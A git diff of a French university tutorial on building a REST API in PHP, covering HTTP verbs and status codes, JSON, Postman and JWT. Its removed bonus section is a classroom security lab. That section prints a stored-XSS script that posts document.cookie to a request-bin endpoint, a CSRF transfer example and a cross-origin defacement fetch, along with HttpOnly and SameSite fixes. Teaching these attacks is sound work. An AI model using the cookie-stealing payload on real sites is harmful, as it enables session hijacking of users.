@@ -1,11 +1,12 @@
 ---
 title: TD3 &ndash; Développer une API REST
-subtitle: Nommage des URI, verbes HTTP, découvrabilité, authentification par JWT
+subtitle: Nommage des URI, verbes HTTP, authentification par JWT
 layout: tutorial
 lang: fr
 ---
 {% raw %}
 
+## API REST
 
 Les API permettent la communication entre différents composants de votre
 application et entre votre application et d’autres développeurs, par
@@ -25,76 +26,75 @@ Les aspects fondamentaux d'un service Web *RESTful* sont :
 * utiliser les codes de réponse *HTTP* pour indiquer si une requête a pu être
   traitée avec succès ;
 * échanger des données au format *JSON* (ou *XML*) ;
-* être sans état (*Stateless*), c'est-à-dire que chaque requête / réponse ne se souvient pas des anciennes. 
+* être sans état (*Stateless*), ou sans mémoire, c'est-à-dire que chaque
+  requête / réponse ne se souvient pas des anciennes. 
 * le fonctionnement du service doit pouvoir être découvert, c'est-à-dire que
   l'on fournit des URL sur les actions liées à une ressource.
 
 
-
-
-
-Une ressource est un objet de type nominal 
-Les ressources sont regroupées en collection et sont nommées au pluriel.
-Les données REST peuvent être en langage JSON ou XML, mais le JSON est le plus courant.
-Source : https://openclassrooms.com/fr/courses/6573181-adoptez-les-api-rest-pour-vos-projets-web/6817356-utilisez-les-ressources-et-collections-rest
-
-
-
-
-
-## Autre source
-
-
-
+### Détails supplémentaires
 
 Reprenons ces aspects plus en détail : 
-* utiliser des verbes HTTP : 
+
+#### Noms des ressources
+
+Prenons un exemple de bon URL : `/client/33245/commandes/8769/categories/1`.
+
+On voit que les ressources utilisent des noms, et pas des verbes, en minuscule.
+Les ressources sont regroupées en collection et sont nommées au pluriel. On
+utilise les sous-chemins pour indiquer l'appartenance à une sous-ressource. Par
+exemple, l'URL précédente fait référence aux produits de la catégori `1` qui appartiennent à la commande `8769` du client `33245`.
+
+#### Verbes HTTP 
+
+Pour indiquer une action sur une ressource, on utilise des verbes HTTP : 
   * `GET` : lire une ressource,
   * `POST` : créer une nouvelle ressource,
   * `PUT` : mettre à jour une ressource complètement en la remplaçant,
   * `PATCH` : mettre à jour une ressource partiellement en la modifiant 
-     <!-- https://stackoverflow.com/questions/28459418/use-of-put-vs-patch-methods-in-rest-api-real-life-scenarios -->
   * `DELETE` : supprimer une ressource,
-* adopter une convention de nommage pour les identifiants de ressources (URI).
-  En pratique, cela signifie : 
-  *  indiquer les identifiants dans l'URL plutôt que dans le *query string*  
-     * Bon URI : `/users/12345`
-     * Mauvais URI : `/api?type=user&id=23`
-  * Utiliser le pluriel dans les URI pour garder une cohérence entre les différents URI : 
-    * Bon URI : `/customers/33245/orders/8769/lineitems/1`
-    * Mauvais URI : `/customer/33245/order/8769/lineitem/1`
-  * Ne pas utiliser de verbe dans l'URI ; c'est le verbe *HTTP* qui indiquera l'action.
-  * Mettre les URI en minuscule, en séparant éventuellement les mots par des *tirets bas* `_`.
-* Utiliser les codes de réponse *HTTP* pour indiquer si une requête a pu être
-  traitée avec succès. Complétons les codes déjà vus avec les 10 codes les plus utilisés : 
+
+<!-- https://stackoverflow.com/questions/28459418/use-of-put-vs-patch-methods-in-rest-api-real-life-scenarios -->
+
+#### Les codes de statut *HTTP*
+
+Les codes de réponse *HTTP* servent à indiquer si une requête a pu être traitée
+avec succès. Complétons les codes déjà vus avec les 10 codes les plus utilisés : 
   * Codes de succès `2xx` : 
-    * `200 OK` (attribut `HTTP_OK`)  
+    * `200 OK` (attribut `HTTP_OK` de l'objet *PHP* `Response`)  
       Code de succès générique. Code le plus utilisé.
     * `201 CREATED` (attribut `HTTP_CREATED`)  
-      Création d'entité réussie, généralement à la suite d'une requête
-      `POST`. Il est courant de fournir un lien vers la ressource créée dans l'en-tête `Location :`. Le corps de réponse peut être vide.
+      Création d'entité réussie, généralement à la suite d'une requête `POST`.
+      Il est courant de fournir un lien vers la ressource créée dans l'en-tête
+      `Location :`. Le corps de réponse peut être vide.
     * `204 NO CONTENT` (attribut `HTTP_NO_CONTENT`)  
       Code de succès qui signale un corps de requête vide, généralement à la suite d'une requête `DELETE` ou `PUT`.
-  * Codes de redirection `3xx` déjà présentés ; 
-  * Codes d'erreur côté client `4xx` déjà présentés ; 
+  * Codes de redirection `3xx` déjà présentés dans 
+    [le TD2]({{site.baseurl}}/R4.A.10-ComplementWeb/tutorials/tutorial2#des-redirections-plus-propres) :
+    * `301 MOVED PERMANENTLY` : redirection permanente 
+    * `302 FOUND` : redirection temporaire   
+  * Codes d'erreur côté client `4xx` déjà présentés dans 
+    [le TD2]({{site.baseurl}}/R4.A.10-ComplementWeb/tutorials/tutorial2#utilisation-des-codes-de-réponses-pour-les-erreurs) : 
+    * `400 BAD REQUEST` : erreur générique
+    * `401 UNAUTHORIZED` : le client doit s'authentifier,
+    * `403 FORBIDDEN` : le client authentifié n'a pas les droits
+    * `404 NOT FOUND` : ressource inconnue
+    * `405 METHOD NOT ALLOWED` : verbe *HTTP* non pris en charge,
+    * `409 CONFLICT` : conflit avec une ressource existante,
   * Codes d'erreur côté serveur `5xx` :
     * `500 INTERNAL SERVER ERROR` (attribut `HTTP_INTERNAL_SERVER_ERROR`)  
       Ne devrait jamais être renvoyé intentionnellement. Généralement, ce code provient d'un `try / catch` global sur le serveur qui traite les exceptions inattendues avec un code `500`. 
-* Échanger des données au format *JSON*. Idéalement, on devrait aussi supporter le format `XML` et passer de l'un à l'autre en fonction de l'en-tête [*HTTP* *Accept*](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept).
 
+#### Tableau récapitulatif
 
-
-| Verbe *HTTP* | CRUD           | Collection entière (par ex. `/customers`)                                                                                                             | Item spécifique (par ex. `/customers/{id}`)                                                 |
-| ------------ | -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
-| `POST`       | Create         | `201` (`Created`), en-tête `Location` avec un lien vers `/customers/{id}` contenant le nouvel ID. <br> `409` (`Conflict`) si la ressource existe déjà | `405` (`Method Not Allowed`)                                                                |
-| `GET`        | Read           | `200` (`OK`), liste de clients. Utiliser la pagination, le tri et le filtrage pour parcourir de grandes listes.                                       | `200` (`OK`), client particulier. `404` (`Not Found`), si l'ID est inconnu ou invalide.     |
-| `PUT`        | Update/Replace | `405` (`Method Not Allowed`)                                       | `200` (`OK`) ou `204` (`No Content`). `404` (`Not Found`), si l'ID est inconnu ou invalide. |
-| `PATCH`      | Update/Modify  | `405` (`Method Not Allowed`)                                                           | `200` (`OK`) ou `204` (`No Content`). `404` (`Not Found`), si l'ID est inconnu ou invalide. |
-| `DELETE`     | Delete         | `405` (`Method Not Allowed`)                                       | `200` (`OK`) ou `204` (`No Content`). `404` (`Not Found`), si l'ID est inconnu ou invalide. |
+| Verbe *HTTP* | CRUD    | Collection entière (par ex. `/customers`)                              | Item spécifique (par ex. `/customers/{id}`)                                           |
+| ------------ | ------- | ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
+| `POST`       | Create  | `201` (`Created`). <br> `409` (`Conflict`) si la ressource existe déjà | `405` (`Method Not Allowed`)                                                          |
+| `GET`        | Read    | `200` (`OK`), liste de clients.                                        | `200` (`OK`), client particulier.  <br> `404` (`Not Found`), si l'ID est inconnu.     |
+| `PUT`        | Replace | `405` (`Method Not Allowed`)                                           | `200` (`OK`) ou `204` (`No Content`).  <br> `404` (`Not Found`), si l'ID est inconnu. |
+| `PATCH`      | Modify  | `405` (`Method Not Allowed`)                                           | `200` (`OK`) ou `204` (`No Content`).  <br> `404` (`Not Found`), si l'ID est inconnu. |
+| `DELETE`     | Delete  | `405` (`Method Not Allowed`)                                           | `200` (`OK`) ou `204` (`No Content`).  <br> `404` (`Not Found`), si l'ID est inconnu. |
 {: .centered .pretty}
-
-Source : [RestAPITutorial.com](https://www.restapitutorial.com/lessons/restquicktips.html)
-
 
 ## Échange de données en *JSON*
 
@@ -144,7 +144,8 @@ regroupées sous l'URL `/web/api/`.
    ```
 
 2. Créez un nouveau contrôleur `ControleurPublicationAPI.php` et une nouvelle
-   action `supprimer($idPublication)` avec le code suivant : 
+   action `supprimer($idPublication)` avec le code suivant. Indiquez le bon code
+   de réponse en cas de succès.
 
    ```php
    namespace TheFeed\Controleur;
@@ -169,7 +170,7 @@ regroupées sous l'URL `/web/api/`.
          try {
                $idUtilisateurConnecte = ConnexionUtilisateur::getIdUtilisateurConnecte()
                $this->publicationService->supprimerPublication($idPublication, $idUtilisateurConnecte);
-               return new JsonResponse('', Response::HTTP_NO_CONTENT);
+               return new JsonResponse('', Response::XXX);
          } catch (ServiceException $exception) {
                return new JsonResponse(["error" => $exception->getMessage()], $exception->getCode());
          }
@@ -212,7 +213,6 @@ Le logiciel est installé sur les machines de l'IUT. Chez vous, vous pouvez le
 
     ![Postman config 1](/R4.A.10-ComplementWeb/assets/TD3/postman1.PNG){: .blockcenter}
 
-    * **TODO** Changer capture écran, mettre le style image
     * Méthode `DELETE`
     * Adresse : [http://webinfo.iutmontp.univ-montp2.fr/~mon_login_IUT/TD3/web/api/feeds](http://webinfo.iutmontp.univ-montp2.fr/~mon_login_IUT/TD3/web/api/feeds)
 
@@ -260,7 +260,8 @@ en attribut JS `indexNumber` avec un nommage *camelCase*.
    {#  fin si #}
    ```
 
-2. Créez un script `web/assets/js/main.js` avec le contenu suivant : 
+2. Créez un script `web/assets/js/main.js` avec le contenu suivant. Remplacez
+   `XXX` par le code de succès émis par votre API REST (*cf.* Exercice 1.2) : 
 
    ```js
    /**
@@ -273,7 +274,7 @@ en attribut JS `indexNumber` avec un nommage *camelCase*.
 
       fetch(URL, {method: "DELETE"})
          .then(response => {
-               if (response.status === 204) {
+               if (response.status === XXX) {
                   // Plus proche ancêtre <div class="feedy">
                   let divFeedy = button.closest("div.feedy");
                   divFeedy.remove();
@@ -375,8 +376,6 @@ Nous allons utiliser ces notions lors de la création d'une requête qui renvoie
    <!-- Response::HTTP_NOT_FOUND -->
 </div>
 
-**TODO** Insérer blabla sur la convention de nommage des routes ici !
-
 <div class="exercise">
 
 1. Appliquez le même procédé pour que la route `GET` d'URL
@@ -401,7 +400,7 @@ Nous allons utiliser ces notions lors de la création d'une requête qui renvoie
    $dateTime->format('d F Y');
    ```
 
-1. Testez la route avec un identifiant de publication connu et un inconnu.
+2. Testez la route avec un identifiant de publication connu et un inconnu.
 </div>
 
 
@@ -419,8 +418,6 @@ Nous allons maintenant créer une route pour poster un *feedy*. Comme le message
 du *feedy* ne peut pas raisonnablement être inclus dans l'URL, nous allons
 l'envoyer dans le corps de la requête. Et quel format de données allons-nous
 utiliser : *JSON* bien sûr !
-
-**TODO** : code de réponse 201 `HTTP_CREATED`.
 
 <div class="exercise">
 
@@ -443,7 +440,7 @@ utiliser : *JSON* bien sûr !
    }
    ```
 
-1. Créez la méthode `ControleurPublicationAPI::submitFeedy` avec le code
+2. Créez la méthode `ControleurPublicationAPI::submitFeedy` avec le code
    suivant, que nous allons compléter par la suite.
 
    ```php
@@ -454,13 +451,14 @@ utiliser : *JSON* bien sûr !
 
          $idUtilisateurConnecte = ConnexionUtilisateur::getIdUtilisateurConnecte();
          $publication = $this->publicationService->creerPublication($idUtilisateurConnecte, $message);
-         return new JsonResponse($publication, Response::HTTP_CREATED);
+         return new JsonResponse($publication, Response::XXX);
       } catch (ServiceException $exception) {
          return new JsonResponse(["error" => $exception->getMessage()], $exception->getCode());
       } 
    }
    ``` 
-2. Complétez la méthode précédente avec les consignes suivantes : 
+3. Complétez la méthode précédente avec les consignes suivantes : 
+   * Indiquez le bon code de réponse en cas de succès.
    * Le corps d'une requête se récupère avec `$request->getContent()`,
    * une chaîne de caractères au format *JSON* se décode avec `json_decode($string)`,
    * si l'objet décodé du *JSON* ne contient pas d'attribut message, assignez la
@@ -472,7 +470,7 @@ utiliser : *JSON* bien sûr !
      $valeur = $objet->attribut ?? "valeur par défaut";
      ```
 
-3. En cas de corps de requête malformé, `json_decode` va échouer. Pour traiter
+4. En cas de corps de requête malformé, `json_decode` va échouer. Pour traiter
    cette erreur, on demande à `json_decode` de lancer une `JsonException` avec
    la commande
    ```php
@@ -491,7 +489,7 @@ utiliser : *JSON* bien sûr !
     }
     ```
 
-4. Créez une nouvelle route `/web/api/feeds` de méthode `POST` qui appelle
+5. Créez une nouvelle route `/web/api/feeds` de méthode `POST` qui appelle
    `submitFeedy`. avec corps de requête contenant le message
 
 </div>
@@ -522,8 +520,6 @@ Nous allons maintenant tester notre route avec *Postman*.
 7. Sur *Postman*, cliquez sur l'onglet `Headers` de l’onglet. Ajoutez une
    nouvelle clé `Cookie` puis, comme valeur, collez le résultat précédemment
    récupéré comme valeur.
-
-   **TODO** Màj capture
 
    ![Postman config 2](/R4.A.10-ComplementWeb/assets/TD3/postman2.PNG){: .blockcenter}
 
@@ -557,7 +553,8 @@ Nous allons maintenant tester notre route avec *Postman*.
    ```
 
 2. Nous vous fournissons la méthode de base pour soumettre un *feedy*.
-   **Copiez** ce code dans `main.js`.
+   **Copiez** ce code dans `main.js` et remplacez `XXX` par le code de succès
+   émis par votre API REST.
 
    ```js
    async function submitFeedy() {
@@ -578,7 +575,7 @@ Nous allons maintenant tester notre route avec *Postman*.
 
          // Ajouter un corps de requête contenant le message
       });
-      if (response.status !== 201)
+      if (response.status !== XXX)
          // (Hors TD) Il faudrait traiter l'erreur 
          return; 
       let feedy = await response.json();
@@ -734,8 +731,13 @@ Un `JWT` décodé est composé de 3 parties :
 
 1. la <span style="color:#00b9f1">signature</span> du message
 
-Pour former le jeton final, chaque partie est 
-[encodée en `base64`](https://fr.wikipedia.org/wiki/Base64), puis concaténée avec des points `.` : 
+Pour former le jeton final, chaque partie est [encodée en
+`base64`](https://fr.wikipedia.org/wiki/Base64), puis concaténée avec des points
+`'.'`. Dans l'exemple suivant, <span style="color:#fb015b">la partie
+rouge</span> est l'encodage en `base64` de l'en-tête, <span
+style="color:#d63aff">la partie violette</span> est l'encodage en `base64` du
+corps de message et <span style="color:#00b9f1">la partie bleu ciel</span> est
+la signature : 
 
 <pre><div style="padding: 1em;background:white"><span style="color:#fb015b">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.<span style="color:#d63aff">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ</span>.<span style="color:#00b9f1">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span></div></pre>
 
@@ -984,7 +986,7 @@ avantages clés des API REST sont les suivants :
   d'économiser des requêtes aux serveurs. 
 * Dans le cas d'un site Web déployé sur plusieurs serveurs, l'élimination des
   sessions évite de devoir synchroniser ces informations de sessions entre
-  serveurs.
+  serveurs, et les problèmes difficiles qui en découlent.
 
 Dans ce TD, nous n'avons pas eu le temps d'évoquer quelques aspects importants : 
 * un service Web *Restful* doit être un service découvrable, c'est-à-dire qu'il
@@ -996,260 +998,20 @@ Dans ce TD, nous n'avons pas eu le temps d'évoquer quelques aspects importants 
   * lors de la lecture d'une collection, chaque entité renvoie ses liens d'actions,
   * toujours lors de la lecture d'une collection, des liens `first`, `last`,
     `next` et `prev` sont un minimum pour permettre de pouvoir naviguer
-    facilement dans la collection.
+    facilement dans la collection,
+* un service Web *RESTful* professionnel devrait aussi supporter le format `XML`
+  et passer de l'un à l'autre en fonction de l'en-tête 
+  [*HTTP Accept*](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept).
 *  Le filtrage, la recherche et le tri sont des moyens d’ajouter de la
    complexité à vos requêtes API. La pagination aide vos clients et utilisateurs
    API à éviter d’être submergés par trop de données. Le versionnage vous permet
    de continuer à mettre à jour votre API sans casser le code des personnes qui
    en dépendent déjà.
 
-Sources :
-[OpenClassrooms](https://openclassrooms.com/fr/courses/6573181-adoptez-les-api-rest-pour-vos-projets-web/), [Wikipedia](https://fr.wikipedia.org/wiki/Representational_state_transfer), [ChatGPT](https://chat.openai.com/chat)
-
-## Bonus pour la SAÉ : Sécurité 
-
-Si vous manquez de temps, appliquez juste la sécurisation des exercices 16 & 17
-sans essayer de reproduire les attaques.
-
-### Faille `XSS`
-
-Découvrons 
-[la faille de sécurité *Cross Site Scripting* (`XSS`)](https://developer.mozilla.org/fr/docs/Glossary/Cross-site_scripting) sur un exemple.
-
-<div class="exercise">
-
-1. Rendez votre site vulnérable en désactivant l'échappement `htmlspecialchars`.
-   Pour ceci, modifiez le code suivant dans `feed.html.twig` : 
-   
-   ```diff
-   - <p>{{ publication.message }}</p>
-   + <p>{{ publication.message | raw }}</p>
-   ```
-
-   Remarquez par la même occasion que l'utilisation d'un framework professionnel
-   protège souvent contre ce genre de vulnérabilité.
-
-1. Rechargez la page. Elle doit afficher un pop-up message si vous avez toujours
-   le message original `<script>alert("message")</script>`. Sinon, postez un tel
-   message pour voir le pop-up s'afficher.
-
-1. Donc un utilisateur malveillant peut poster un *feed* vérolé, ce qui lui
-   permettra d'exécuter du code JavaScript chez tous les visiteurs de *The Feed*. Comme JavaScript a accès aux cookies par défaut, ça devient dangereux.
-
-   [**Créez** un panier à requête public](https://requestbin.com/r) 
-   (*request bin* en anglais) pour collecter toutes les requêtes faites à une URL. 
-   Enregistrez bien l'URL (*endpoint*) donné et gardez cette page ouverte.
-
-1. Postez le message suivant en remplaçant par votre *endpoint* : 
-
-   ```html
-   <script>
-      fetch('https://ent4gomyidhlf.x.pipedream.net',{
-      body: JSON.stringify(document.cookie),
-      method: "POST"
-      });
-   </script>
-   ```
-
-   **Rechargez** la page pour qu'il soit affiché par Twig (et non créé par
-   JavaScript). Ce *feed* envoie votre identifiant de session au panier de requête.
-
-1. Il ne reste plus qu'à collecter la requête sur la page Web associée à votre
-   *endpoint*. Cliquez sur votre requête qui est apparue à gauche, puis retrouvez votre l'identifiant de session `PHPSESSID` dans les informations sur la requête (corps de requête = *Body*).  
-
-</div>
-
-La première solution a ce problème est donc de bien échapper votre *HTML*. Nous
-pouvons aller plus loin en rendant les cookies non accessibles depuis JavaScript. C'est le rôle de [l'attribut `HttpOnly` d'un cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies).
-
-<div class="exercise">
-
-1. Pour protéger notre cookie `auth_token`, activons l'attribut `HttpOnly` à
-   tous nos cookies. Dans la classe `Cookie`, changez la méthode `enregistrer()` : 
-   
-   ```php
-   public static function enregistrer(string $cle, mixed $valeur, ?int $dureeExpiration = null): void
-   {
-      $valeurJSON = serialize($valeur);
-      $options = [
-         "httponly" => true,
-      ];
-      if ($dureeExpiration === null)
-         $options["expires"] = 0;
-      else
-         $options["expires"] = time() + $dureeExpiration;
-      setcookie($cle, $valeurJSON, $options);
-   }
-   ```
-   
-1. Pour protéger notre identifiant de session `PHPSESSID` qui est stocké dans un
-   cookie, nous devons utiliser un mécanisme similaire. Dans `Session`, changez le constructeur : 
-
-   ```php
-   private function __construct()
-   {
-      $options = [
-         "cookie_httponly" => "1",
-      ];
-      // session_set_cookie_params($dureeExpiration);
-      if (session_start($options) === false) {
-         throw new Exception("La session n'a pas réussi à démarrer.");
-      }
-   }
-   ```
-
-1. Supprimez les cookies sur votre site Web en utilisant les outils de
-   développement. Reconnectez-vous.  
-   **Vérifiez** dans les outils de développement
-   que les deux cookies ont l'attribut `HttpOnly` activé.  
-   **Exécutez** le code JavaScript suivant dans la console pour vérifier que les
-   cookies ne sont plus accessibles : 
-   ```js
-   document.cookie
-   ```
-
-1. Testez que votre site Web marche toujours bien, en particulier les
-   fonctionnalités *JavaScript*. Bizarre, non ? C'est le sujet de la prochaine
-   section.
-
-2. Vous pouvez remettre `{{ publication.message }}` dans `feed.html.twig`.
-
-</div>
-
-### Faille de sécurité `CSRF`
-
-Comment se fait-il que les fonctionnalités *JavaScript* fonctionnent toujours ?
-*JavaScript* envoie des requêtes qui ont besoin d'une authentification via le
-cookie `auth_token` pour fonctionner. 
-
-C'est normal que cela marche bien, car même si *JavaScript* n'a plus accès aux
-cookies, le navigateur les rajoute aux requêtes faites par `fetch()`.
-
-Ce comportement est malheureusement la base de la faille de sécurité *Cross-Site
-Request Forgery* (`CSRF`). Exposons les grandes idées de la faille : 
-* dans un navigateur, vous êtes connectés au site de votre banque `https://mabanque.fr`.
-  L'authentification se fait par un cookie.
-* Dans un autre onglet de votre navigateur, vous allez sur un site malveillant.
-  Ce site se sert de JavaScript pour lancer la requête suivante 
-  ```
-  https://mabanque.fr?action=virement&montant=1000000&beneficiaire=DrEvil 
-  ```
-* Comme le navigateur rajoute les cookies aux requêtes, votre banque croit que
-  l'action vient de vous et transfère l'argent.
-
-Heureusement, les navigateurs modernes ont des défenses contre ce genre
-d'attaque. L'idée de base est qu'il ne faut pas rajouter un cookie aux requêtes
-si la requête provient d'un domaine différent. Dans l'exemple précédent, le
-navigateur n'intégrerait pas les cookies du domaine `mabanque.fr` puisque la
-requête provient d'un autre site. Pour votre culture information, cette
-problématique a donné lieu à un protocole pour définir la politique de partage
-des ressources entre origines multiples : le [*Cross-origin resource sharing*
-(CORS)](https://developer.mozilla.org/fr/docs/Web/HTTP/CORS).
-
-Dans le cadre de ce TD, nous allons juste indiquer à nos cookies de n'être rajoutés que lorsque les requêtes viennent du même site.
-
-<div class="exercise">
-
-1. Dans la classe `Cookie`, changez la méthode `enregistrer()` : 
-   
-   ```diff
-     $options = [
-        "httponly" => true,
-   +    "samesite" => "Strict",
-     ];
-   ```
-   
-1. Pour protéger notre identifiant de session `PHPSESSID` qui est stocké dans un
-   cookie, nous devons utiliser un mécanisme similaire. Dans `Session`, changez le constructeur : 
-
-   ```diff
-     $options = [
-        "cookie_httponly" => "1",
-   +    "cookie_samesite" => "Strict",
-     ];
-   ```
-
-</div>
-
-<!-- #### (Bonus) Exemple pratique
-
-Difficile à mettre en place car il faut désactiver beaucoup de sécurités
-
-Requête à faire depuis la console dans le site `https://www.google.com` (exemple)
-
-```js
-fetch(
-   'http://localhost/~lebreton/ComplementWeb2223/TD3_tentative/web/api/feeds',
-   {
-      mode: 'cors',
-      method: 'POST',
-      body: JSON.stringify({message : "Owned ! Defaced !"}),
-      credentials: 'include'
-   }
-);
-```
-
-`RouteurURL`
-```php
-$route = new Route("/api/feeds", [
-   "_controller" => ['publication_controleur_api', "afficherListe"],
-]);
-$route->setMethods(["GET", "OPTIONS"]);
-```
-
-et plus loin dans `RouteurURL`
-
-```php
-$reponse->headers->add([
-   'Access-Control-Allow-Origin' => 'https://www.google.com',
-   'Access-Control-Allow-Credentials' => 'true'
-]);
-```
-   
-`Cookie` pour `auth_token` : 
-```php
-$options = [
-   "httponly" => true,
-   "samesite" => "None",
-   "secure" => true
-];
-``` 
--->
-
-<!-- 
-TODO : Essayer l'attaque où {{message | raw}} et 
-fetch(
-   'http://localhost/~lebreton/ComplementWeb2223/TD3_tentative/web/api/feeds/api/feeds',
-   {
-      method: 'POST',
-      body: JSON.stringify({message : "Owned ! Defaced !"}),
-   }
-);
-
-Solution : CSRF token !
-
--->
+Sources du TD :
+[OpenClassrooms](https://openclassrooms.com/fr/courses/6573181-adoptez-les-api-rest-pour-vos-projets-web/), [Wikipedia](https://fr.wikipedia.org/wiki/Representational_state_transfer), [RestAPITutorial.com](https://www.restapitutorial.com/lessons/restquicktips.html) et [ChatGPT](https://chat.openai.com/chat)
 
 
-## Bonus pour la SAÉ : Tests systèmes
-
-Simuler une requête en la construisant 
-
-```php
-$request = new Request(
-    $_GET,
-    $_POST,
-    [],
-    $_COOKIE,
-    $_FILES,
-    $_SERVER
-);
-```
-
-Changer `traiterRequete()` : entrée requête, sortie réponse
-reponse->send() dans controleurFrontal
-
-Devrait permettre de tester plus facilement l'API REST.
 
 <!--
 ## Sources
